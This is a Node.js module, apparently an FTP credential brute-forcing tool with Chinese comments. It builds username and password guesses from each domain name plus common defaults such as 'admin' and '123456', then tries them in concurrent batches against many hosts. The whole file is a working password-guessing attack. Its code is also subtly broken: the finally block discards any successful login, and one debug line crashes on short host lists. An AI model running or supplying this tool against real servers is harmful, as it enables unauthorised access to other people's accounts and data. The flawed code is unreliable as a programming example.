const Client = require("ftp");
const _ = require("lodash");
const chalk = require("chalk");
const cp = option => {
  return new Promise((resolve, reject) => {
    let c = new Client();
    c.connect({...option,connTimeout: 10000});
    c.on("ready", () => {
      resolve({...option,success: true});
      c.end();
    });
    c.on("error", e => {
      resolve({...option,success: false});
      c.end();
    });
  });
};

// 获取猜测的用户名和密码
const guess=host=>{
  let arr =host.split(".")
  let users=[
    host,"admin","test",arr[1],`${arr[1]}123`,`${arr[1]}${arr[2]}`,`${arr[1]}.${arr[2]}`,`${arr[1]}${arr[2]}123`,`${arr[1]}.${arr[2]}123`,`webmaster@${arr[1]}.${arr[2]}`,
  ]
  let passwords=users.concat([123456,12345678,123456789])
  let result=[]
  for(let i=0,len=users.length;i<len;i++){
    for(let j=0,len2=passwords.length;j<len2;j++){
      result.push({host:host,user:users[i],password:passwords[j]})
    }
  }
  return result
}


//单独爆破一个域名
const blastOne=async host=>{
  try{
    let group=guess(host)
    let groups=_.chunk(group,60)
    for(let i=0,len=groups.length;i<len;i++){
      let list=groups[i].map(item=>cp({  
        host:item.host,
        user: item.user,
        password: item.password,
      }))
      let data=await Promise.all(list)
      //每10个判断一次是否成功
      let success=data.find(key=>key.success)
      if(success){
        return success
      }
    }
  }catch(e){
    console.log(chalk.red(e));
  }finally{
    return {host:host,success:false}
  }
}

const blast=async hosts=>{
  try{
    let res=[]
    let hostsGroups=_.chunk(hosts,50)
    console.log(hostsGroups[1].length)
    for(let i=0,len=hostsGroups.length;i<len;i++){
      let list=hostsGroups[i].map(host=>blastOne(host))
      console.log(111)
      let hostsGroupRes=await Promise.all(list)
      console.log(222)
      Array.prototype.push.apply(res,hostsGroupRes)
      // console.log(res)
    }
    console.log(123123)
    console.log(res)
    return res
  }catch(e){
    console.log(chalk.red(e));
  }
}
module.exports=blast